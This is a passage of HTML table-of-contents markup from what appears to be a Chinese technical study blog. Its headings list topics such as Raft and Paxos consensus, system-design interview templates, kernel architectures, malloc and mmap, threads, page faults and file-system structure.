class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82"><span class="toc-text">🔹客户端请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9%E6%97%A5%E5%BF%97%E8%BF%BD%E5%8A%A0%EF%BC%88Append%EF%BC%89"><span class="toc-text">🔹日志追加（Append）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-3-%E6%97%A5%E5%BF%97%E5%A4%8D%E5%88%B6%E4%B8%8E%E6%8F%90%E4%BA%A4"><span class="toc-text">✅ 3. 日志复制与提交</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9%E7%A1%AE%E8%AE%A4%E5%A4%8D%E5%88%B6"><span class="toc-text">🔹确认复制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9%E5%BA%94%E7%94%A8%E5%88%B0%E7%8A%B6%E6%80%81%E6%9C%BA"><span class="toc-text">🔹应用到状态机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%81-4-%E5%BF%83%E8%B7%B3%E7%BB%B4%E6%8C%81"><span class="toc-text">🔁 4. 心跳维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-5-%E6%95%85%E9%9A%9C%E5%88%87%E6%8D%A2%EF%BC%88%E6%AF%94%E5%A6%82-Leader-%E5%AE%95%E6%9C%BA%EF%BC%89"><span class="toc-text">⚠️ 5. 故障切换（比如 Leader 宕机）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Raft-%E6%98%AF%E5%BC%BA%E4%B8%80%E8%87%B4%E6%80%A7%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="toc-text">Raft 是强一致性的协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-Raft-%E7%9A%84%E5%BC%BA%E4%B8%80%E8%87%B4%E6%80%A7%E8%AF%AD%E4%B9%89%E6%98%AF%E8%BF%99%E6%A0%B7%E5%AE%9A%E4%B9%89%E7%9A%84%EF%BC%9A"><span class="toc-text">💡 Raft 的强一致性语义是这样定义的：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%B3%A8%E6%84%8F%EF%BC%9ARaft-%E4%B8%8D%E8%A6%81%E6%B1%82%E6%89%80%E6%9C%89%E8%8A%82%E7%82%B9%E5%A7%8B%E7%BB%88%E5%90%8C%E6%AD%A5"><span class="toc-text">✅ 注意：Raft 不要求所有节点始终同步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%9F-%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-text">🌟 场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%97%E8%BF%99%E6%97%B6%E5%80%99%E4%BD%A0%E9%97%AE%EF%BC%9A"><span class="toc-text">❗这时候你问：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%98%AF%E7%9A%84%EF%BC%8C%E4%BD%86%EF%BC%9A"><span class="toc-text">✅ 是的，但：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%81-%E5%90%8E%E7%BB%AD%E6%81%A2%E5%A4%8D%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-text">🔁 后续恢复过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9D%931-Leader-%E5%86%99%E5%85%A5%E5%90%8E%EF%BC%8CA%E3%80%81B%E3%80%81C-%E4%BC%9A%E4%B8%8D%E4%BC%9A%E6%8F%90%E4%BE%9B%E8%AF%BB%E5%8F%96%E6%9C%8D%E5%8A%A1%EF%BC%9F"><span class="toc-text">❓1. Leader 写入后，A、B、C 会不会提供读取服务？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BA%E4%BB%80%E4%B9%88-%E8%AF%BB%E4%B9%9F%E6%8E%A8%E8%8D%90%E5%8F%AA%E4%BB%8E-Leader%EF%BC%9F"><span class="toc-text">✅ 为什么 读也推荐只从 Leader？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%89%80%E4%BB%A5%E5%B8%B8%E8%A7%81-Raft-%E7%9A%84%E8%AF%BB%E6%B5%81%E7%A8%8B%E6%98%AF%E8%BF%99%E6%A0%B7%E7%9A%84%EF%BC%9A"><span class="toc-text">🧠 所以常见 Raft 的读流程是这样的：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-Read-from-Leader%EF%BC%9A"><span class="toc-text">💡 Read from Leader：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9D%93%E9%82%A3-Followers-%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8%EF%BC%9F"><span class="toc-text">❓那 Followers 有什么用？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%B1-Follower-%E7%9A%84%E4%BD%9C%E7%94%A8%EF%BC%9A"><span class="toc-text">🧱 Follower 的作用：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Paxos协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%AA-%E7%BC%96%E7%A8%8B%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84-Paxos-%E6%B5%81%E7%A8%8B%E4%B8%BE%E4%BE%8B"><span class="toc-text">🧪 编程场景下的 Paxos 流程举例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E8%AE%BE%E5%AE%9A%EF%BC%9A"><span class="toc-text">场景设定：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-1-Proposer-%E5%8F%91%E8%B5%B7%E5%87%86%E5%A4%87%E8%AF%B7%E6%B1%82%EF%BC%88Prepare-%E9%98%B6%E6%AE%B5%EF%BC%89%EF%BC%9A"><span class="toc-text">💡 1. Proposer 发起准备请求（Prepare 阶段）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-2-Proposer-%E5%8F%91%E8%B5%B7%E6%AD%A3%E5%BC%8F%E6%8F%90%E8%AE%AE%EF%BC%88Accept-%E9%98%B6%E6%AE%B5%EF%BC%89%EF%BC%9A"><span class="toc-text">💡 2. Proposer 发起正式提议（Accept 阶段）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%85%B1%E8%AF%86%E8%BE%BE%E6%88%90%EF%BC%81"><span class="toc-text">✅ 共识达成！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9B%92-%E7%94%9F%E6%B4%BB%E7%B1%BB%E6%AF%94%E5%9C%BA%E6%99%AF%EF%BC%9A%E2%80%9C%E4%B8%89%E4%BA%BA%E6%8A%95%E7%A5%A8%E5%86%B3%E5%AE%9A%E5%8E%BB%E5%93%AA%E5%90%83%E9%A5%AD%E2%80%9D"><span class="toc-text">🛒 生活类比场景：“三人投票决定去哪吃饭”</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%91-%E4%BD%A0-Proposer%EF%BC%9A%E4%BD%A0%E6%8F%90%E5%87%BA%E4%B8%80%E4%B8%AA%E6%83%B3%E6%B3%95"><span class="toc-text">🧑 你 &#x3D; Proposer：你提出一个想法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%91%A9-A-%E5%92%8C-%F0%9F%91%A8-B-Acceptor%EF%BC%9A%E4%BB%96%E4%BB%AC%E7%AD%94%E5%BA%94%E4%B8%8D%E6%8E%A5%E5%8F%97%E6%9B%B4%E5%B0%8F%E7%BC%96%E5%8F%B7%E7%9A%84%E6%96%B9%E6%A1%88"><span class="toc-text">👩 A 和 👨 B &#x3D; Acceptor：他们答应不接受更小编号的方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%91-%E4%BD%A0%E7%BB%A7%E7%BB%AD%E8%AF%B4%EF%BC%9A%E2%80%9C%E9%82%A3%E6%88%91%E4%BB%AC%E5%B0%B1%E5%AE%9A%E4%BA%86%EF%BC%8C%E5%8E%BB%E5%90%83%E7%81%AB%E9%94%85%EF%BC%81%E2%80%9D"><span class="toc-text">🧑 你继续说：“那我们就定了，去吃火锅！”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%98-%E4%BE%8B%E5%AD%90%E5%A4%8D%E7%8E%B0%E4%B8%80%E4%B8%8B%E6%83%85%E6%99%AF%EF%BC%9A"><span class="toc-text">📘 例子复现一下情景：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%8F%A0-%E6%83%85%E6%99%AF%E8%AE%BE%E5%AE%9A%EF%BC%9A%E5%A4%A7%E5%AE%B6%E8%A6%81%E9%80%89%E4%BB%8A%E6%99%9A%E5%90%83%E4%BB%80%E4%B9%88%E5%A4%96%E5%8D%96"><span class="toc-text">🏠 情景设定：大家要选今晚吃什么外卖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%A5%A2-%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%9A%E5%B0%8F%E6%9D%8E%E5%8F%91%E8%B5%B7%E6%8F%90%E6%A1%88"><span class="toc-text">🥢 场景一：小李发起提案</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%A5%A2-%E5%9C%BA%E6%99%AF%E4%BA%8C%EF%BC%9A%E5%B0%8F%E5%BC%A0%E5%90%8E%E6%9D%A5%E6%9D%A5%E4%BA%86%EF%BC%8C%E4%B9%9F%E5%8F%91%E8%B5%B7%E4%BA%86%E6%8F%90%E6%A1%88"><span class="toc-text">🥢 场景二：小张后来来了，也发起了提案</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%A7%A0-%E8%BF%99%E4%B8%AA%E7%BC%96%E5%8F%B7%E6%9C%BA%E5%88%B6%E9%98%B2%E6%AD%A2%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">🧠 这个编号机制防止了什么？</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">高可用、高并发、高性能</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E9%AB%98%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E8%AF%9D%E6%9C%AF%E6%A8%A1%E6%9D%BF%EF%BC%88%E9%80%9A%E7%94%A8%E7%89%88%EF%BC%89"><span class="toc-text">三高系统设计面试话术模板（通用版）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A9-1-%E9%AB%98%E5%B9%B6%E5%8F%91%EF%BC%88High-Concurrency%EF%BC%89"><span class="toc-text">🧩 1. 高并发（High Concurrency）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A9-2-%E9%AB%98%E5%8F%AF%E7%94%A8%EF%BC%88High-Availability%EF%BC%89"><span class="toc-text">🧩 2. 高可用（High Availability）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A9-3-%E9%AB%98%E6%80%A7%E8%83%BD%EF%BC%88High-Performance%EF%BC%89"><span class="toc-text">🧩 3. 高性能（High Performance）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9A%80-%E5%8A%A0%E5%88%86%E8%AE%B2%E6%B3%95%EF%BC%9A%E7%BB%93%E5%90%88%E4%BD%A0%E9%A1%B9%E7%9B%AE%E5%AE%9E%E9%99%85%E8%AF%B4%E4%B8%80%E9%81%8D"><span class="toc-text">🚀 加分讲法：结合你项目实际说一遍</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">宏内核、微内核、混合型内核</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%80%E5%9B%BE%E4%B8%89%E8%A7%A3%EF%BC%9A%E5%AE%8F%E5%86%85%E6%A0%B8-vs-%E5%BE%AE%E5%86%85%E6%A0%B8-vs-%E6%B7%B7%E5%90%88%E5%86%85%E6%A0%B8"><span class="toc-text">🧠 一图三解：宏内核 vs 微内核 vs 混合内核</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%95-1-%E5%AE%8F%E5%86%85%E6%A0%B8%EF%BC%88Monolithic-Kernel%EF%BC%89"><span class="toc-text">🌕 1. 宏内核（Monolithic Kernel）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%B1-2-%E5%BE%AE%E5%86%85%E6%A0%B8%EF%BC%88Microkernel%EF%BC%89"><span class="toc-text">🌱 2. 微内核（Microkernel）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%A1-3-%E6%B7%B7%E5%90%88%E5%86%85%E6%A0%B8%EF%BC%88Hybrid-Kernel%EF%BC%89"><span class="toc-text">⚡ 3. 混合内核（Hybrid Kernel）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%91%F0%9F%92%BC-%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF%EF%BC%88%E7%AE%80%E6%B4%81%E9%AB%98%E6%95%88%EF%BC%89%EF%BC%9A"><span class="toc-text">🧑💼 面试回答模板（简洁高效）：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">linux的内核设计理念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81MultiTask%EF%BC%88%E5%A4%9A%E4%BB%BB%E5%8A%A1%EF%BC%89"><span class="toc-text">1、MultiTask（多任务）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E8%A7%A3%E9%87%8A%EF%BC%9A-6"><span class="toc-text">✅ 解释：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%9D%A2%E8%AF%95%E7%82%B9%EF%BC%9A"><span class="toc-text">🧠 面试点：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81SMP%EF%BC%88Symmetric-Multi-Processing%EF%BC%8C%E5%AF%B9%E7%A7%B0%E5%A4%9A%E5%A4%84%E7%90%86%EF%BC%89"><span class="toc-text">2、SMP（Symmetric Multi-Processing，对称多处理）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E8%A7%A3%E9%87%8A%EF%BC%9A-7"><span class="toc-text">✅ 解释：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%93%8C-%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-text">📌 特点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%9D%A2%E8%AF%95%E7%82%B9%EF%BC%9A-2"><span class="toc-text">🧠 面试点：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81ELF%EF%BC%88Executable-and-Linkable-Format%EF%BC%89"><span class="toc-text">3、ELF（Executable and Linkable Format）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E8%A7%A3%E9%87%8A%EF%BC%9A-8"><span class="toc-text">✅ 解释：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%93%8C-%E5%8C%85%E5%90%AB%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-text">📌 包含内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%9D%A2%E8%AF%95%E7%82%B9%EF%BC%9A-3"><span class="toc-text">🧠 面试点：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81Monolithic-Kernel%EF%BC%88%E5%AE%8F%E5%86%85%E6%A0%B8%EF%BC%89"><span class="toc-text">4、Monolithic Kernel（宏内核）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E8%A7%A3%E9%87%8A%EF%BC%9A-9"><span class="toc-text">✅ 解释：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%93%8C-%E7%89%B9%E7%82%B9%EF%BC%9A-2"><span class="toc-text">📌 特点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%9D%A2%E8%AF%95%E7%82%B9%EF%BC%9A-4"><span class="toc-text">🧠 面试点：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">malloc、mmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">🧬 二、工作原理解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B8-malloc-%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0%EF%BC%9A"><span class="toc-text">🔸 malloc 原理简述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B8-mmap-%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0%EF%BC%9A"><span class="toc-text">🔸 mmap 原理简述：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-text">🔍 详细解释：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B8-malloc%EF%BC%88%E5%9F%BA%E4%BA%8E%E5%A0%86%EF%BC%89"><span class="toc-text">🔸 malloc（基于堆）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A-3"><span class="toc-text">示例：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B8-mmap%EF%BC%88%E5%86%85%E6%A0%B8%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%89"><span class="toc-text">🔸 mmap（内核系统调用）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1%EF%BC%9A%E5%8C%BF%E5%90%8D%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%EF%BC%88%E7%B1%BB%E4%BC%BC-malloc%EF%BC%89"><span class="toc-text">示例 1：匿名内存映射（类似 malloc）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-2%EF%BC%9A%E6%96%87%E4%BB%B6%E6%98%A0%E5%B0%84%EF%BC%88%E7%B1%BB%E4%BC%BC%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-text">示例 2：文件映射（类似读取文件）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%A1-mmap-%E5%92%8C-malloc-%E7%9A%84%E5%85%B3%E7%B3%BB%EF%BC%9A"><span class="toc-text">💡 mmap 和 malloc 的关系：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%9D%A2%E8%AF%95%E8%AF%9D%E6%9C%AF%E6%A8%A1%E6%9D%BF%E6%8E%A8%E8%8D%90%EF%BC%9A"><span class="toc-text">🧠 面试话术模板推荐：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E6%9C%80%E4%BD%B3%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">🎯 最佳总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Efree"><span class="toc-text">关于free</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-malloc-%E7%9A%84%E5%88%86%E9%85%8D%E8%A1%8C%E4%B8%BA%E8%AF%A6%E8%A7%A3%EF%BC%9A"><span class="toc-text">✅ malloc 的分配行为详解：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-%E4%B8%80%E3%80%81%E5%BD%93-malloc-size-%E4%B8%AD%E7%9A%84-size-%E5%B0%8F%E4%BA%8E%E7%AD%89%E4%BA%8E128KB-%E6%97%B6%EF%BC%9A"><span class="toc-text">🔹 一、当 malloc(size) 中的 size 小于等于128KB 时：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-%E4%BA%8C%E3%80%81%E5%BD%93-malloc-size-%E4%B8%AD%E7%9A%84-size-%E5%A4%A7%E4%BA%8E128KB%EF%BC%88%E5%A6%82-200KB%E3%80%811MB%EF%BC%89-%E6%97%B6%EF%BC%9A"><span class="toc-text">🔹 二、当 malloc(size) 中的 size 大于128KB（如 200KB、1MB） 时：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">内存满了，会发生什么？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">虚拟地址空间、虚拟内存总量</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90%E6%9B%B4%E7%9B%B4%E8%A7%82"><span class="toc-text">💡 举个例子更直观</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">为什么线程崩溃不会导致 JVM 崩溃</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%A5-%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0%EF%BC%9A-hello-world-%E6%98%AF%E5%AD%98%E5%82%A8%E5%9C%A8%E5%8F%AA%E8%AF%BB%E7%9A%84-%E5%B8%B8%E9%87%8F%E5%8C%BA%EF%BC%88Text-Segment%EF%BC%89"><span class="toc-text">🔥 根本原因：&quot;hello world&quot; 是存储在只读的 常量区（Text Segment）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E5%86%99%E6%B3%95%EF%BC%9A%E7%94%A8%E6%95%B0%E7%BB%84%E5%88%86%E9%85%8D%E5%8F%AF%E5%86%99%E5%86%85%E5%AD%98"><span class="toc-text">✅ 正确写法：用数组分配可写内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-4"><span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">用户线程、内核线程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%BA%BF%E7%A8%8B%EF%BC%88User-Level-Thread-ULT%EF%BC%89"><span class="toc-text">用户线程（User-Level Thread, ULT）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B%EF%BC%88Kernel-Level-Thread-KLT%EF%BC%89"><span class="toc-text">内核线程（Kernel-Level Thread, KLT）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E7%94%9F%E6%B4%BB%E4%BE%8B%E5%AD%90%EF%BC%9A%E5%BF%AB%E9%80%92%E5%85%AC%E5%8F%B8%E5%92%8C%E5%85%AC%E5%8F%B8%E5%91%98%E5%B7%A5"><span class="toc-text">✅ 生活例子：快递公司和公司员工</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%A8%E6%88%B7%E7%BA%BF%E7%A8%8B%EF%BC%88%E5%91%98%E5%B7%A5%E8%87%AA%E5%B7%B1%E8%B0%83%E5%BA%A6%E8%87%AA%E5%B7%B1%EF%BC%89"><span class="toc-text">1. 用户线程（员工自己调度自己）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B%EF%BC%88%E5%9B%BD%E5%AE%B6%E7%BB%9F%E4%B8%80%E5%88%86%E9%85%8D%E4%BB%BB%E5%8A%A1%EF%BC%89"><span class="toc-text">2. 内核线程（国家统一分配任务）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E6%AF%94%E7%90%86%E8%A7%A3%EF%BC%88%E5%9B%A2%E9%98%9F%E5%B7%A5%E4%BD%9C%EF%BC%89"><span class="toc-text">类比理解（团队工作）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">进程间的通信方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">java各种容器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">缺页中断和一般中断的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E8%A1%A5%E5%85%85%E8%A7%A3%E9%87%8A"><span class="toc-text">✅ 补充解释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B8-%E4%B8%BA%E4%BB%80%E4%B9%88%E7%BC%BA%E9%A1%B5%E4%B8%AD%E6%96%AD%E8%A6%81%E3%80%8C%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8C%E3%80%8D%E9%82%A3%E6%9D%A1%E6%8C%87%E4%BB%A4%EF%BC%9F"><span class="toc-text">🔸 为什么缺页中断要「重新执行」那条指令？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B8-%E4%B8%80%E8%88%AC%E4%B8%AD%E6%96%AD%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AF%E4%BB%A5%E4%BB%8E%E3%80%8C%E4%B8%8B%E4%B8%80%E6%9D%A1%E6%8C%87%E4%BB%A4%E3%80%8D%E6%89%A7%E8%A1%8C%EF%BC%9F"><span class="toc-text">🔸 一般中断为什么可以从「下一条指令」执行？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%B8%AA%E5%BD%A2%E8%B1%A1%E7%9A%84%E7%94%9F%E6%B4%BB%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-text">✅ 举个形象的生活例子：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%A6-%E7%BC%BA%E9%A1%B5%E4%B8%AD%E6%96%AD%EF%BC%9A"><span class="toc-text">📦 缺页中断：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%8F%B0-%E4%B8%80%E8%88%AC%E4%B8%AD%E6%96%AD%EF%BC%9A"><span class="toc-text">⏰ 一般中断：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">操作系统在打开文件表中维护着打开文件的状态和信息：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E6%8C%87%E9%92%88%EF%BC%88File-Pointer%EF%BC%89"><span class="toc-text">1. 文件指针（File Pointer）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E6%89%93%E5%BC%80%E8%AE%A1%E6%95%B0%E5%99%A8%EF%BC%88File-Open-Counter%EF%BC%89"><span class="toc-text">2. 文件打开计数器（File Open Counter）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E7%A3%81%E7%9B%98%E4%BD%8D%E7%BD%AE%EF%BC%88Disk-Location%EF%BC%89"><span class="toc-text">3. 文件磁盘位置（Disk Location）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%EF%BC%88Access-Rights%EF%BC%89"><span class="toc-text">4. 访问权限（Access Rights）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">文件系统的结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E128MB%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6%E5%88%B0%E5%9D%97%E7%BB%84%E8%AE%BE%E8%AE%A1%E7%9A%84%E9%80%BB%E8%BE%91%E8%A7%A3%E6%9E%90"><span class="toc-text">从128MB空间限制到块组设计的逻辑解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E4%B8%AA%E5%9D%97%E4%BD%8D%E5%9B%BE%E7%9A%84%E5%AE%B9%E9%87%8F%E9%99%90%E5%88%B6"><span class="toc-text">单个块位图的容量限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%97%E7%BB%84%E8%AE%BE%E8%AE%A1%E7%9A%84%E6%A0%B8%E5%BF%83%E6%80%9D%E6%83%B3"><span 